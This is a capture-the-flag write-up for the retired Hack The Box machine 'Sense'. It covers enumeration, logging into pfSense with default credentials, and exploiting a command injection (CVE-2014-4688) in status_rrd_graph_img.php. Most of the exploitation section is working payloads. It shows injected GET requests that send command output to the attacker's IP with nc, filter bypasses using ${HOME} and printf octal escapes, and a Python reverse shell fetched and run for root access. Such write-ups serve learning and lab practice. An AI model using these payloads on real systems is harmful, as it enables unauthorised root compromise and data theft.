# Sense

This is the write-up for the box Sense that got retired at the 24th March 2018.
My IP address was 10.10.14.11 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.60    sense.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/sense.nmap 10.10.10.60
```

```markdown
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
```

## Checking HTTP and HTTPS (Port 80 & 443)

The web service on port 80 forwards to the web service on port 443 and it greets us with a **pfSense** login page:

![pfSense Login](https://kyuu-ji.github.io/htb-write-up/sense/sense_web-1.png)

This software is an open-source firewall and router software that is based on **FreeBSD**.
By default it has a Brute-Force protection that bans IP addresses for 24 hours after 15 failed login attempts, so we can't guess usernames.

But it is possible to search for hidden directories or files with **Gobuster**:
```markdown
gobuster -u https://10.10.10.60 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt -t 250
```

I look for _txt_ files because searching for directories did not get any interesting results.
This way it finds two _txt_ files:
- /changelog.txt
```markdown
# Security Changelog

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

- /system-users.txt
```markdown
####Support ticket###

Please create the following user

username: Rohit
password: company defaults
```

The _changelog.txt_ shows that two out of three vulnerabilities are patched, so there is probably one that we can exploit.
In the _system-users.txt_ we get a the username _Rohit_ who has the company default password.

We don't know the company default password but when trying the default password for **pfSense**, which is _pfsense_, we get logged in with _rohit_.

![pfSense Dashboard](https://kyuu-ji.github.io/htb-write-up/sense/sense_web-2.png)

The version of this pfSense installation is 2.1.3 and we can search for public vulnerabilities:
```markdown
searchsploit pfsense
```

The vulnerability _"pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection"_ looks like one that we can use.
This vulnerability is registered with the CVE number **CVE-2014-4688**.
An explanation about this vulnerability can be found in [this blog post from Proteansec](https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/).

### Command Execution

We need to send a GET request to the _"database"_ parameter which can be found in pfSense:
```markdown
Status --> RRD Graphs --> Right click on image --> View Image

https://10.10.10.60/status_rrd_graph_img.php?start=1586492753&end=1586521553&database=system-processor.rrd&style=inverse&graph=eight_hour
```

Lets send this request to **Burpsuite** and make it cleaner:
```markdown
GET /status_rrd_graph_img.php?&database=queues HTTP/1.1
```

Now we can start with the command execution:
```markdown
GET /status_rrd_graph_img.php?&database=queues;sleep+10
```

The response for this request takes about 10 seconds which means the `sleep` command went through and command execution works.
Unfortunately there is not output to stdout when executing something that needs output like `whoami`.

To get around this we use `nc` to connect to our client and use it as stdout:
```markdown
# Start listener on port 9001
nc -lvnp 9001

# Send request
GET /status_rrd_graph_img.php?&database=queues;whoami|nc+10.10.14.11+9001
```

The listener on my IP and port 9001 shows the output of `whoami` and it displays root.
When trying to start a reverse shell it won't work because there is a filter implemented for some special characters. For example the _slash_ character and _dash_ character does not work.

#### Bypassing the character filter

We can take a _slash_ character out of one of the environment variables.
```markdown
GET /status_rrd_graph_img.php?&database=queues;env|nc+10.10.14.11+9001
```

The environment variable for _HOME_ consists of a _slash_ character.
```markdown
GET /status_rrd_graph_img.php?&database=queues;echo+${HOME}test|nc+10.10.14.11+9001
```

The output of this request is _"/test"_ and thus we got a slash character. This way we can examine the whole filesystem:
```markdown
# Start listener on port 9001 and redirect to file
nc -lvnp 9001 > filesystem.txt

# Send request
GET /status_rrd_graph_img.php?&database=queues;find+${HOME}|nc+10.10.14.11+9001
```

Now a _dash_ character is needed to use parameters for commands. We can get this character by using the octal of the ASCII character of the dash with `printf`. The octal for _dash_ in the ASCII table is _55_.   
```markdown
GET /status_rrd_graph_img.php?&database=queues;printf+"\55"|nc+10.10.14.11+9001
```

The output of this request is a dash character.

### Starting a reverse shell

With all these workarounds to bypass the character filter, a reverse shell should be possible to execute.
First creating a Python reverse shell called _revshell.py_:
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.11",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Starting a listener on port 9001 with a redirect to _revshell.py_:
```markdown
nc -lvnp 9001 < revshell.py

nc -lvnp 1234
```

Sending the request:
```markdown
GET /status_rrd_graph_img.php?&database=queues;nc+10.10.14.11+9001|python
```

The listener on my IP and port 1234 starts a reverse shell connection as root!
